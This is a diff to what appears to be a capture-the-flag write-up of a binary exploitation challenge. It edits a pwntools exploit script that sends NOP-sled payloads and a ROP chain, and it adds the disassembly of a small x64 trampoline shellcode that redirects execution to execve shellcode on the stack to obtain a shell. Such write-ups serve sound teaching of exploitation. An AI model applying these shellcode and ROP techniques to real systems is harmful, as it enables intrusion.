@@ -248,11 +248,11 @@ continue
 
 io = start()
 
-# create 10 users to make the shellcode closer...
+# create 10 users to make the shellcode closer to RBP...
 for i in range(0, 10):
     io.sendline(b'1')
     io.recvuntil(b"What's the new recipient's name:")
-    payload = b"\x90" * 31 # shellcode here
+    payload = b"\x90" * 31
     io.sendline(payload)
 
 # add payload to users by using the "send message" feature
@@ -280,6 +280,15 @@ io.sendline(rop_chain)
 
 io.interactive()
 ```
+
+The trampoline shell code is pretty simple. It changes the returned pointer by `fgets` when feedback is received, by subtracting it a number of bytes. This, in an attempt to land in the stack where the `execve` syscall shellcode is. It also "repairs" `RBP`, since earlier got overflown with trash bytes.
+```x64
+0:  48 89 e0                mov    rax,rsp
+3:  48 2d 8c 00 00 00       sub    rax,0x8c
+9:  48 89 e5                mov    rbp,rsp
+c:  ff e0                   jmp    rax 
+```
+
 
 **Solution**
 
